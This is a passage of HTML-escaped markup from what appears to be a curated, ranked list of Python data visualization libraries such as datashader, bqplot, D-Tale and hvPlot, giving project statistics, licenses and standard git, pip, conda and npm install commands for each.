month · 📦 96 · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vispy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/vispy&#34;&gt;Conda&lt;/a&gt; (📥 230K · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge vispy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/vispy&#34;&gt;npm&lt;/a&gt; (📥 40 / month · ⏱️ 15.03.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install vispy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/holoviz/datashader&#34;&gt;datashader&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.8K) - Quickly and accurately render even the largest data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/holoviz/datashader&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 47 · 🔀 350 · 📦 1.1K · 📋 500 - 25% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/holoviz/datashader&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/datashader&#34;&gt;PyPi&lt;/a&gt; (📥 44K / month · 📦 95 · ⏱️ 07.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install datashader&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/datashader&#34;&gt;Conda&lt;/a&gt; (📥 300K · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge datashader&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bqplot/bqplot&#34;&gt;bqplot&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 3.3K) - Plotting library for IPython/Jupyter notebooks. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bqplot/bqplot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 57 · 🔀 460 · 📦 30 · 📋 580 - 38% open · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bqplot/bqplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/bqplot&#34;&gt;PyPi&lt;/a&gt; (📥 81K / month · 📦 92 · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install bqplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/bqplot&#34;&gt;Conda&lt;/a&gt; (📥 970K · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge bqplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/bqplot&#34;&gt;npm&lt;/a&gt; (📥 26K / month · 📦 10 · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install bqplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/man-group/dtale&#34;&gt;D-Tale&lt;/a&gt;&lt;/b&gt; (🥉30 · ⭐ 3.4K) - Visualizer for pandas data structures. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=LGPL-2.1&#34;&gt;❗️LGPL-2.1&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/man-group/dtale&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 23 · 🔀 270 · 📦 370 · 📋 460 - 8% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/man-group/dtale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dtale&#34;&gt;PyPi&lt;/a&gt; (📥 65K / month · 📦 12 · ⏱️ 08.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dtale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dtale&#34;&gt;Conda&lt;/a&gt; (📥 120K · ⏱️ 08.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dtale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ResidentMario/missingno&#34;&gt;missingno&lt;/a&gt;&lt;/b&gt; (🥉30 · ⭐ 3.2K) - Missing data visualization module for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ResidentMario/missingno&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 410 · 📦 7.4K · 📋 120 - 5% open · ⏱️ 27.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ResidentMario/missingno&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/missingno&#34;&gt;PyPi&lt;/a&gt; (📥 1M / month · 📦 120 · ⏱️ 27.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install missingno&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/missingno&#34;&gt;Conda&lt;/a&gt; (📥 160K · ⏱️ 15.02.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge missingno&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/data-validation&#34;&gt;data-validation&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 640) - Library for exploring and validating machine learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/data-validation&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 120 · 📥 360 · 📦 480 · 📋 160 - 23% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/data-validation&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-data-validation&#34;&gt;PyPi&lt;/a&gt; (📥 1.3M / month · 📦 27 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-data-validation&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/holoviz/hvplot&#34;&gt;hvPlot&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 560) - A high-level plotting API for pandas, dask, xarray, and networkx built on.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/holoviz/hvplot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 68 · 📦 1.3K · 📋 420 - 34% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/holoviz/hvplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hvplot&#34;&gt;PyPi&lt;/a&gt; (📥 130K / month · 📦 62 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hvplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hvplot&#34;&gt;Conda&lt;/a&gt; (📥 170K · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hvplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PAIR-code/facets&#34;&gt;Facets Overview&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 6.9K · 💤) - Visualizations for machine learning datasets. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PAIR-code/facets&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 28 · 🔀 840 · 📦 120 · 📋 150 - 50% open · ⏱️ 06.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pair-code/facets&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/facets-overview&#34;&gt;PyPi&lt;/a&gt; (📥 280K / month · 📦 4 · ⏱️ 24.07.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install facets-overview&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jupyter-widgets/pythreejs&#34;&gt;pythreejs&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 820) - A Jupyter - Three.js bridge. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jupyter-widgets/pythreejs&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 180 · 📦 19 · 📋 220 - 33% open · ⏱️ 06.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jupyter-widgets/pythreejs&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pythreejs&#34;&gt;PyPi&lt;/a&gt; (📥 56K / month · 📦 38 · ⏱️ 26.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pythreejs&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pythreejs&#34;&gt;Conda&lt;/a&gt; (📥 390K · ⏱️ 02.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pythreejs&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/jupyter-threejs&#34;&gt;npm&lt;/a&gt; (📥 5.6K / month · 📦 7 · ⏱️ 26.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install jupyter-threejs&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ContextLab/hypertools&#34;&gt;HyperTools&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.7K) - A Python toolbox for gaining geometric insights into high-dimensional.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ContextLab/hypertools&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 160 · 📥 14 · 📦 190 · 📋 190 - 35% open · ⏱️ 12.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ContextLab/hypertools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hypertools&#34;&gt;PyPi&lt;/a&gt; (📥 810 / month · 📦 10 · ⏱️ 12.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hypertools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pavlin-policar/openTSNE&#34;&gt;openTSNE&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1K) - Extensible, parallel implementations of t-SNE. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pavlin-policar/openTSNE&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 120 · 📦 340 · 📋 100 - 3% open · ⏱️ 18.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pavlin-policar/openTSNE&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/opentsne&#34;&gt;PyPi&lt;/a&gt; (📥 16K / month · 📦 9 · ⏱️ 18.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install opentsne&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/opentsne&#34;&gt;Conda&lt;/a&gt; (📥 140K · ⏱️ 13.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge opentsne&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/JetBrains/lets-plot&#34;&gt;lets-plot&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 740) - An open-source plotting library for statistical data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/JetBrains/lets-plot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 33 · 📥 260 · 📦 16 · 📋 250 - 29% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/JetBrains/lets-plot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lets-plot&#34;&gt;PyPi&lt;/a&gt; (📥 1.9K / month · 📦 1 · ⏱️ 21.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lets-plot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vega/ipyvega&#34;&gt;vega&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 330) - IPython/Jupyter notebook module for Vega and Vega-Lite. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/vega/ipyvega&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 59 · 📋 94 - 12% open · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/vega/ipyvega&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vega&#34;&gt;PyPi&lt;/a&gt; (📥 5.7K / month · 📦 84 · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vega&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/vega&#34;&gt;Conda&lt;/a&gt; (📥 480K · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge vega&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AutoViML/AutoViz&#34;&gt;AutoViz&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 700) - Automatically Visualize any dataset, any size with a single line of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/AutoViML/AutoViz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 100 · 📦 190 · 📋 54 - 7% open · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/AutoViML/AutoViz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/autoviz&#34;&gt;PyPi&lt;/a&gt; (📥 55K / month · 📦 6 · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install autoviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/autoviz&#34;&gt;Conda&lt;/a&gt; (📥 4.7K · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge autoviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/hiplot&#34;&gt;HiPlot&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 2.3K) - HiPlot makes understanding high dimensional data easy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/hiplot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 8 · 🔀 120 · 📦 4 · 📋 77 - 15% open · ⏱️ 26.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/hiplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hiplot&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 11 · ⏱️ 26.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hiplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hiplot&#34;&gt;Conda&lt;/a&gt; (📥 85K · ⏱️ 05.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hiplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fbdesignpro/sweetviz&#34;&gt;Sweetviz&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 2K · 💤) - Visualize and compare datasets, target values and associations, with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/fbdesignpro/sweetviz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 200 · 📋 99 - 28% open · ⏱️ 08.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/fbdesignpro/sweetviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sweetviz&#34;&gt;PyPi&lt;/a&gt; (📥 91K / month · 📦 5 · ⏱️ 08.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sweetviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sweetviz&#34;&gt;Conda&lt;/a&gt; (📥 10K · ⏱️ 09.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sweetviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PatrikHlobil/Pandas-Bokeh&#34;&gt;Pandas-Bokeh&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 780) - Bokeh Plotting Backend for Pandas and GeoPandas. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PatrikHlobil/Pandas-Bokeh&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 100 · 📋 97 - 31% open · ⏱️ 25.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PatrikHlobil/Pandas-Bokeh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pandas-bokeh&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 11 · ⏱️ 11.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pandas-bokeh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/marcharper/python-ternary&#34;&gt;python-ternary&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 560) - Ternary plotting library for python with matplotlib. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/marcharper/python-ternary&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 140 · 📥 17 · 📦 93 · 📋 120 - 22% open · ⏱️ 27.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/marcharper/python-ternary&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/python-ternary&#34;&gt;PyPi&lt;/a&gt; (📥 15K / month · 📦 21 · ⏱️ 17.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install python-ternary&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/python-ternary&#34;&gt;Conda&lt;/a&gt; (📥 62K · ⏱️ 17.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge python-ternary&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ing-bank/popmon&#34;&gt;Popmon&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 300) - Monitor the stability of a Pandas or Spark dataframe. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; 